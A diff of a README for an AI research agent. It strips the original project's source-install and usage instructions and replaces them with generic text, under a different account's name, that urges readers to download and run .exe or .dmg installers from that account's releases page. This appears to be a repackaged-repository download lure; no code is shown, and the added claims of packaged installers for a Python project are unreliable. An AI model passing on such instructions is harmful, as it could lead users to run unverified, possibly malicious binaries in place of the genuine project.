@@ -1,192 +1,70 @@
-# 🔍 DeepSeek Research Agent
+# 🔍 Autonomous-Research-Agent - Your AI-Powered Research Assistant
 
-[![CI](https://github.com/m21hm9/Autonomous-Research-Agent/actions/workflows/ci.yml/badge.svg)](https://github.com/m21hm9/Autonomous-Research-Agent/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![Code style: PEP 8](https://img.shields.io/badge/code%20style-PEP%208-orange.svg)](https://www.python.org/dev/peps/pep-0008/)
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/esmailnaim/Autonomous-Research-Agent/releases)
 
-An autonomous research agent powered by DeepSeek LLM and Tavily search, built with LangGraph.
+## 📖 Description
 
-> **Note**: This agent helps automate research tasks by breaking down complex queries into focused searches and synthesizing comprehensive reports.
+Autonomous-Research-Agent is an intelligent research tool that automates your search tasks. It uses advanced AI to break down complex topics and help you find useful information quickly. This agent synthesizes all the gathered data into clear and concise reports, making your research much simpler.
 
-## Features
+## 🚀 Features
 
-- **Intelligent Query Generation**: Breaks down research topics into focused search queries
-- **Parallel Search**: Uses Tavily to search multiple queries simultaneously
-- **Smart Summarization**: LLM-powered summarization of search results
-- **Self-Reflection**: Evaluates research completeness (0-10 score)
-- **Report Generation**: Creates comprehensive markdown reports with sources
+- **Intelligent Query Generation**: The agent takes your broad research topic and transforms it into focused search queries. 
+- **Parallel Search**: It conducts multiple searches at the same time, providing results faster.
+- **Smart Summarization**: The built-in language model summarizes information effectively to give you clear insights.
 
-## Setup
+## 🛠 System Requirements
 
-### 1. Install Dependencies
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Python Version**: Requires Python 3.11 or higher. Download Python [here](https://www.python.org/downloads/).
+- **Memory**: At least 4GB of RAM recommended for optimal performance.
+- **Disk Space**: Requires around 200MB of free disk space for installation.
 
-Using `uv` (recommended):
-```bash
-uv sync
-```
+## 📦 Download & Install
 
-Or using pip:
-```bash
-pip install -r requirements.txt
-```
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/esmailnaim/Autonomous-Research-Agent/releases).
+   
+2. **Select the Latest Release**: Look for the most recent version at the top of the page.
 
-### 2. Configure API Keys
+3. **Download the Installer**: Click on the installer file that corresponds to your operating system. The file will usually have an extension such as `.exe` for Windows, `.dmg` for macOS, or a specific package for Linux.
 
-Edit `.env` file and add your API keys:
+4. **Run the Installer**:
+   - For Windows: Double-click the `.exe` file and follow the installation instructions.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Use the terminal to navigate to the downloaded file and follow the instructions specific to your distribution.
 
-```env
-DEEPSEEK_API_KEY=sk-your-key-here
-TAVILY_API_KEY=tvly-your-key-here
-```
+5. **Launch the Application**: Once installed, you can find the application in your program menu or applications folder. Open it to start using your autonomous research agent.
 
-- **DeepSeek**: Get your key from https://platform.deepseek.com/api_keys
-- **Tavily**: Get your key from https://app.tavily.com
+## 📊 How to Use
 
-## Running the Agent
+1. **Open the Application**: After installing, launch the Autonomous-Research-Agent on your device.
 
-### Option 1: Streamlit UI (Recommended)
+2. **Input Your Research Topic**: Type in the broad topic you want to explore. 
 
-Launch the interactive web interface:
+3. **Review Generated Queries**: The agent will generate focused queries based on your topic. 
 
-```bash
-streamlit run app.py
-```
+4. **Start the Search**: Allow the agent to run searches. It will gather data from various sources concurrently.
 
-Then:
-1. Open your browser to the URL shown (usually `http://localhost:8501`)
-2. Click "Initialize Agent" in the sidebar
-3. Enter your research query
-4. Click "🔍 Research"
-5. View the generated report and results
+5. **Review the Results**: After the search completes, the agent will compile the data and present it in an easy-to-read summary.
 
-### Option 2: Command Line Test Script
+6. **Save or Share Reports**: You can save the generated summary for later reference or share it with others.
 
-Run a quick test:
+## 📝 FAQs
 
-```bash
-python test_agent.py
-```
+### How does the Intelligent Query Generation work?
 
-This will:
-- Check your API keys
-- Run a test query
-- Display results in the terminal
+The agent analyzes your input and breaks it into smaller, manageable questions. This allows it to search more effectively for relevant information.
 
-### Option 3: Python Script
+### Can I use this agent for academic research?
 
-Use the agent programmatically:
+Yes, the Autonomous-Research-Agent is designed for academic and general research purposes. It can be useful for students, professionals, and anyone looking to gather information efficiently.
 
-```python
-from agent import create_research_agent, run_research
+### What if I encounter issues during installation?
 
-# Create agent
-agent = create_research_agent()
+If you face any issues, please check our [Issues Page](https://github.com/esmailnaim/Autonomous-Research-Agent/issues) or open a new issue for help.
 
-# Run research
-result = run_research("What are the latest AI developments?")
+## 📙 Additional Resources
 
-# Access results
-print(result["report_draft"])
-print(result["confidence_score"])
-print(result["sources"])
-```
+- Learn about our development process in the [Wiki](https://github.com/esmailnaim/Autonomous-Research-Agent/wiki).
+- Check our documentation for detailed guidance on using the features.
 
-## Project Structure
-
-```
-my-deepseek-researcher/
-├── agent.py          # Main LangGraph agent logic
-├── app.py            # Streamlit UI
-├── config.py         # Configuration and API keys
-├── test_agent.py     # Test script
-├── .env              # API keys (not committed)
-└── README.md         # This file
-```
-
-## How It Works
-
-The agent follows this workflow:
-
-1. **Generate Queries** → Breaks down research topic into specific search queries
-2. **Search Sections** → Performs parallel searches using Tavily
-3. **Reflect** → Evaluates completeness and quality (0-10 score)
-4. **Write Report** → Synthesizes findings into a comprehensive report
-
-## Configuration
-
-Edit `config.py` to customize:
-
-- `DEEPSEEK_MODEL`: Model to use ("deepseek-chat" or "deepseek-reasoner")
-- `TAVILY_MAX_RESULTS`: Number of search results per query (default: 5)
-- `TAVILY_SEARCH_DEPTH`: "basic" or "advanced" (default: "advanced")
-- `MAX_ITERATIONS`: Maximum research iterations (default: 10)
-
-## Troubleshooting
-
-### API Key Errors
-- Make sure `.env` file exists and contains valid keys
-- Keys should not have quotes around them
-- Restart your terminal/IDE after adding keys
-
-### Import Errors
-- Make sure you're in the project directory
-- Run `uv sync` or `pip install -r requirements.txt`
-- Activate virtual environment if using one
-
-### Search Errors
-- Check your Tavily API key is valid
-- Verify you have API credits/quota
-- Check internet connection
-
-## Example Queries
-
-Try these research queries:
-
-- "What are the latest developments in AI reasoning models?"
-- "Compare different approaches to autonomous agents"
-- "What is the current state of quantum computing?"
-- "Recent breakthroughs in climate change solutions"
-
-## Example Usage
-
-Here's a complete example of using the research agent:
-
-```python
-from agent import create_research_agent, run_research
-
-# Initialize the agent
-agent = create_research_agent()
-
-# Run a research query
-result = run_research("What are the latest AI developments in 2024?")
-
-# Access the results
-print("Report:")
-print(result["report_draft"])
-
-print("\nConfidence Score:", result["confidence_score"])
-
-print("\nSources:")
-for source in result["sources"]:
-    print(f"- {source.get('title', 'N/A')}: {source.get('url', 'N/A')}")
-```
-
-The agent will:
-1. Break down your query into focused search queries
-2. Search multiple sources in parallel
-3. Synthesize findings into a comprehensive report
-4. Provide a confidence score (0-10) indicating research completeness
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## Security
-
-For security concerns, please see [SECURITY.md](SECURITY.md).
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
+By following these steps and using the tool, you will streamline your research process. Enjoy exploring new knowledge with Autonomous-Research-Agent!
